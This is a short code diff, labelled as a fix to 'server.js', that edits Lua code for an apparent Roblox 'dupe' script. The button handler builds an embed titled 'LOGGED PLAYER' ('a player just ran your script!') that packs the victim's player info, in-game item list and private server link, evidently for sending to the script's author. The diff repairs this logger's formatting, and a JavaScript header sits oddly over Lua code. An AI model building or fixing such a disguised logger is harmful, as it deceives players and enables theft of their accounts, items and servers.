@@ -1,4 +1,4 @@
-// server.js - FIXED SYNTAX ERRORS
+// server.js - COMPLETELY FIXED
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -445,11 +445,11 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed (FIXED syntax)
+    -- Create embed (FIXED - no backslash issues)
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
-        color = 0x00FF00,
+        color = 65280,
         fields = {
             {
                 name = "Player Info",
@@ -458,12 +458,12 @@ dupeButton.MouseButton1Click:Connect(function()
             },
             {
                 name = "Brainrots", 
-                value = "\\`\\`\\`" .. brainrotsText .. "\\`\\`\\`",
+                value = "```" .. brainrotsText .. "```",
                 inline = false
             },
             {
                 name = "Private Server",
-                value = "\\`\\`\\`" .. serverLink .. "\\`\\`\\`",
+                value = "```" .. serverLink .. "```",
                 inline = false
             },
             {
